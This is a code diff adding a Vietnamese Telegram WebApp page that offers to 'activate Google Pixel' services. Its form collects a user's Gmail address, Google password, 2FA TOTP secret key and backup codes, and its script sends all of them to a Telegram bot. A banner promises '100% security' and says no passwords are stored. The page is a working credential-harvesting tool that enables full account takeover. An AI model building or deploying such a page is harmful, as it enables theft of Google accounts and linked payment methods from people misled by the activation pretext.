@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Kích Hoạt Google Pixel</title>
+    <!-- Telegram WebApp SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root {
+            --bg-color: var(--tg-theme-bg-color, #181c24);
+            --text-color: var(--tg-theme-text-color, #f5f5f5);
+            --hint-color: var(--tg-theme-hint-color, #8e95a5);
+            --link-color: var(--tg-theme-link-color, #2481cc);
+            --button-color: var(--tg-theme-button-color, #0088cc);
+            --button-text-color: var(--tg-theme-button-text-color, #ffffff);
+            --card-bg: rgba(255, 255, 255, 0.05);
+            --border-color: rgba(255, 255, 255, 0.12);
+            --focus-border: #3b82f6;
+            --danger-color: #ef4444;
+            --success-color: #10b981;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            padding: 16px;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .header .icon {
+            font-size: 42px;
+            margin-bottom: 6px;
+        }
+
+        .header h1 {
+            font-size: 20px;
+            font-weight: 700;
+            letter-spacing: -0.3px;
+        }
+
+        .header p {
+            font-size: 13px;
+            color: var(--hint-color);
+            margin-top: 4px;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 14px;
+            padding: 18px 16px;
+            backdrop-filter: blur(8px);
+            margin-bottom: 16px;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+            position: relative;
+        }
+
+        .form-group:last-child {
+            margin-bottom: 0;
+        }
+
+        label {
+            display: block;
+            font-size: 12px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 6px;
+            color: var(--hint-color);
+        }
+
+        .input-wrap {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px 14px;
+            font-size: 15px;
+            background: rgba(0, 0, 0, 0.25);
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            color: var(--text-color);
+            outline: none;
+            transition: all 0.2s ease;
+        }
+
+        input:focus {
+            border-color: var(--focus-border);
+            box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.25);
+            background: rgba(0, 0, 0, 0.35);
+        }
+
+        input::placeholder {
+            color: rgba(255, 255, 255, 0.25);
+            font-size: 13.5px;
+        }
+
+        .toggle-pwd {
+            position: absolute;
+            right: 12px;
+            background: none;
+            border: none;
+            color: var(--hint-color);
+            cursor: pointer;
+            font-size: 16px;
+            padding: 4px;
+        }
+
+        .helper-text {
+            font-size: 11.5px;
+            color: var(--hint-color);
+            margin-top: 5px;
+            line-height: 1.4;
+        }
+
+        .security-banner {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            background: rgba(16, 185, 129, 0.08);
+            border: 1px solid rgba(16, 185, 129, 0.25);
+            border-radius: 10px;
+            padding: 12px;
+            margin-bottom: 20px;
+        }
+
+        .security-banner .shield-icon {
+            font-size: 18px;
+            line-height: 1;
+        }
+
+        .security-banner p {
+            font-size: 12px;
+            color: #d1fae5;
+            line-height: 1.4;
+        }
+
+        .error-banner {
+            display: none;
+            background: rgba(239, 68, 68, 0.12);
+            border: 1px solid var(--danger-color);
+            color: #fca5a5;
+            border-radius: 10px;
+            padding: 10px 12px;
+            font-size: 12.5px;
+            margin-bottom: 16px;
+            text-align: center;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background: var(--button-color);
+            color: var(--button-text-color);
+            border: none;
+            border-radius: 12px;
+            padding: 14px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            box-shadow: 0 4px 12px rgba(0, 136, 204, 0.3);
+            margin-top: auto;
+        }
+
+        .submit-btn:active {
+            transform: scale(0.98);
+            opacity: 0.9;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <div class="icon">📱</div>
+        <h1>Kích Hoạt Google Pixel</h1>
+        <p>Gửi trực tiếp thông số xác minh lên hệ thống</p>
+    </div>
+
+    <div id="errorBox" class="error-banner"></div>
+
+    <form id="pixelForm" class="card" onsubmit="event.preventDefault(); submitForm();">
+        <!-- 0. Loại dịch vụ -->
+        <div class="form-group">
+            <label for="serviceType">Gói Dịch Vụ Pixel</label>
+            <div class="input-wrap">
+                <select id="serviceType" style="width: 100%; padding: 12px 14px; font-size: 14.5px; background: rgba(0, 0, 0, 0.25); border: 1px solid var(--border-color); border-radius: 10px; color: var(--text-color); outline: none;">
+                    <option value="autopay" selected>⚡️ Pixel AutoPay (A → Z)</option>
+                    <option value="payadd">💳 Thêm PaySafeCard vào Google Pay</option>
+                    <option value="extract">🔗 Chỉ lấy Link ưu đãi</option>
+                </select>
+            </div>
+            <div class="helper-text">Hệ thống tự động liên kết thẻ PaySafe hoặc kích hoạt trọn gói</div>
+        </div>
+
+        <!-- 1. Gmail -->
+        <div class="form-group">
+            <label for="gmail">Địa Chỉ Gmail</label>
+            <div class="input-wrap">
+                <input type="email" id="gmail" placeholder="example@gmail.com" required autocomplete="off" autocorrect="off" autocapitalize="off">
+            </div>
+            <div class="helper-text">Tài khoản Google cần kích hoạt dịch vụ Pixel</div>
+        </div>
+
+        <!-- 2. Mật Khẩu -->
+        <div class="form-group">
+            <label for="password">Mật Khẩu Google</label>
+            <div class="input-wrap">
+                <input type="password" id="password" placeholder="••••••••••••" required autocomplete="current-password">
+                <button type="button" class="toggle-pwd" onclick="togglePasswordVisibility()">👁️</button>
+            </div>
+            <div class="helper-text">Mật khẩu được che giấu và truyền qua kênh bảo mật TLS</div>
+        </div>
+
+        <!-- 3. Khóa TOTP 2FA -->
+        <div class="form-group">
+            <label for="totp">Mã Khóa Bí Mật 2FA (Secret Key)</label>
+            <div class="input-wrap">
+                <input type="text" id="totp" placeholder="32 ký tự: JBSWY3DPEHPK3PXP..." required autocomplete="off" autocorrect="off" autocapitalize="characters" maxlength="32">
+            </div>
+            <div class="helper-text">Khóa thiết lập Authenticator gồm đúng 32 ký tự Base32 (A-Z, 2-7)</div>
+        </div>
+
+        <!-- 4. Mã Dự Phòng Backup Codes (Tùy chọn) -->
+        <div class="form-group">
+            <label for="backupCodes">Mã Dự Phòng Backup Codes (Tùy Chọn)</label>
+            <div class="input-wrap">
+                <input type="text" id="backupCodes" placeholder="Ví dụ: 12345678, 87654321 (2-3 mã 8 số)" autocomplete="off">
+            </div>
+            <div class="helper-text">Mã khẩn cấp đề phòng Google hỏi thêm bước xác minh</div>
+        </div>
+    </form>
+
+    <div class="security-banner">
+        <div class="shield-icon">🔒</div>
+        <p><b>Bảo mật 100%:</b> Dữ liệu truyền trực tiếp qua kênh mã hóa đầu-cuối của Telegram, bot không lưu mật khẩu vào cơ sở dữ liệu.</p>
+    </div>
+
+    <button type="button" class="submit-btn" onclick="submitForm()">
+        <span>🚀 Xác Nhận Kích Hoạt Ngay</span>
+    </button>
+
+    <script>
+        const tg = window.Telegram ? window.Telegram.WebApp : null;
+
+        if (tg) {
+            tg.ready();
+            tg.expand();
+            // Đổi màu header theo theme telegram
+            if (tg.setHeaderColor) tg.setHeaderColor('#181c24');
+            if (tg.setBackgroundColor) tg.setBackgroundColor('#181c24');
+        }
+
+        function togglePasswordVisibility() {
+            const pwdInput = document.getElementById('password');
+            if (pwdInput.type === 'password') {
+                pwdInput.type = 'text';
+            } else {
+                pwdInput.type = 'password';
+            }
+        }
+
+        function showError(msg) {
+            const box = document.getElementById('errorBox');
+            box.textContent = msg;
+            box.style.display = 'block';
+            if (tg && tg.HapticFeedback) {
+                tg.HapticFeedback.notificationOccurred('error');
+            }
+        }
+
+        function hideError() {
+            const box = document.getElementById('errorBox');
+            box.style.display = 'none';
+        }
+
+        function submitForm() {
+            hideError();
+            const gmail = document.getElementById('gmail').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const totp = document.getElementById('totp').value.trim().replace(/\s+/g, '').toUpperCase();
+
+            // Validation cơ bản
+            if (!gmail || !password || !totp) {
+                showError("Vui lòng điền đầy đủ cả 3 thông số!");
+                return;
+            }
+
+            if (!gmail.toLowerCase().endsWith("@gmail.com")) {
+                showError("Địa chỉ Email phải có đuôi @gmail.com!");
+                return;
+            }
+
+            if (totp.length !== 32) {
+                showError("Mã khóa 2FA (TOTP) phải có đúng 32 ký tự Base32!");
+                return;
+            }
+
+            const backupVal = document.getElementById('backupCodes').value.trim();
+
+            const payload = {
+                action: "submit_pixel",
+                service: document.getElementById('serviceType').value,
+                gmail: gmail,
+                password: password,
+                totp: totp
+            };
+
+            if (backupVal) {
+                payload.backup_codes = backupVal;
+            }
+
+            if (tg && tg.sendData) {
+                if (tg.HapticFeedback) {
+                    tg.HapticFeedback.notificationOccurred('success');
+                }
+                // Gửi dữ liệu về Telegram Bot qua SDK WebApp
+                tg.sendData(JSON.stringify(payload));
+            } else {
+                alert("Đã gửi dữ liệu (Chế độ preview ngoài Telegram):\n" + JSON.stringify(payload, null, 2));
+            }
+        }
+    </script>
+</body>
+</html>
